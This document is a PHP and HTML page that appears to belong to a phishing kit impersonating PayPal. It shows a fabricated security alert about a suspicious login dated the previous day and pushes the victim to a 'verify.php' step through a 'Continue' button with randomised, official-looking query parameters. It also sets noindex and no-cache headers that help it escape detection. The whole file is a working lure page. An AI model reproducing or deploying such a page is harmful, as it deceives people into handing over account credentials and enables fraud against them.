<?php

ob_start();

require __DIR__.'/functions/functions.php';
require __DIR__.'/functions/crypt.php';
require __DIR__.'/../lang/detect.php';


if ($SETTING_SAFE == 1)
{

}
else
{
	header("Location: verify.php?_cmd=".md5(rand(1,999))."&verification_dispatch=".base64_encode(md5(rand(1,100))));
	exit();
}



?>
<!DOCTYPE html>
<html>
<head>
	<title><?php echo $P2_text1; ?></title>
	<link rel="shortcut icon" href="../assets/img/icon.ico" />
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="cache-control" content="no-store">
	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="expires" content="-1">
	<meta http-equiv="pragma" content="no-cache">
	<meta name="robots" content="noindex,nofollow">
	<!-- Style -->
	<link rel="stylesheet" type="text/css" href="../assets/css/safe.css">
	<link rel="stylesheet" type="text/css" href="../assets/css/custom.css">
	<!-- Scripts -->
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
</head>
<body>
<div class="main" style="background-color: #f5f5f5;">
	
	<div id="header">
	  <div class="container-fluid center-block-big">
	    <table>
	      <tbody>
	        <tr>
	          <td>
	            <a href="#">
	              <img src="../assets/img/logo_ppl_106x29.png" width="106" height="29">
	            </a>
	          </td>
	          <td align="right" width="100%">
	          </td>
	        </tr>
	      </tbody>
	    </table>
	  </div>
	</div>
	<div id="wrapper" class="page-container" role="main">
	  <div class="container-fluid trayNavOuter activity-tray activity-tray-large">
	    <div class="trayNavInner">
	      <div class="row row-ie">
	        <div class="col-md-5 logo-block">
	          <div class="row">
	            <div class="col-md-12 peek-shield">
	              <img src="../assets/img/peek-shield-logo.png">
	            </div>
	          </div>
	          <div class="row">
	            <div class="col-md-12">
	              <p class="logo-block-text">
	                <?php echo $P2_text2; ?>
	              </p>
	            </div>
	          </div>
	        </div>
	        <div class="col-md-7 explanation-wrapper">
	          <div class="row">
	            <div class="col-md-12">
	              <header>
	                <h4 class="flat-large-header">
	                  <?php echo $P2_text3; ?>
	                </h4>
	              </header>
	            </div>
	          </div>
	          <div class="row">
	            <div class="col-md-12 explanation-block">
	              <p>
	                <?php echo $P2_text4; ?>
	              </p>
	            </div>
	          </div>
	          <div class="row">
	            <div class="col-md-12">
	              <div class="report-activity-tray">
	                <div class="activities details-box">
	                  <div class="header row no-transactions white-header">
	                    <label class="login-wrapper">
	                      <span class="device">
	                        <?php echo $P2_text5; ?>
	                      </span>
	                      <span class="location span">
	                        <?php echo $P2_text6; ?>
	                      </span>
	                      <span class="time span">
	                       <?php echo date('d/m/Y',strtotime("-1 days")); ?>, 5:12 AM
	                      </span>
	                    </label>
	                  </div>
	                </div>
	              </div>
	              <p>
	                <?php echo $P2_text7; ?>
	              </p>
	              
	              <div class="buttons requirejs-wait" id="activity-skip">
	                <a class="btn btn-primary button" href="verify.php?_cmd=<?php echo md5(rand(1,999)); ?>&verification_dispatch=<?php echo base64_encode(md5(rand(1,100))); ?>">
	                  Continue
	                </a>
	              </div>
	            </div>
	          </div>
	        </div>
	      </div>
	    </div>
	  </div>
	  <br>
	<div id="footer_safe">
	  	<ul>
	  		<li><a href="#"><?php echo $P2_text8; ?></a></li>
	  		<li><a href="#"><?php echo $P2_text9; ?></a></li>
	  	</ul>
  	</div>
  	<br>
</div>
</div>
	<div class="footer_safe_page" id="footer_safe">
	  	<ul>
	  		<li><p><?php echo $P2_text10; ?></p></li>
	  		<li><p> | </p></li>
	  		<li><a href="#"><?php echo $P2_text11; ?></a></li>
	  		<li><a href="#"><?php echo $P2_text12; ?></a></li>
	  	</ul>
  	</div>
</body>
</html>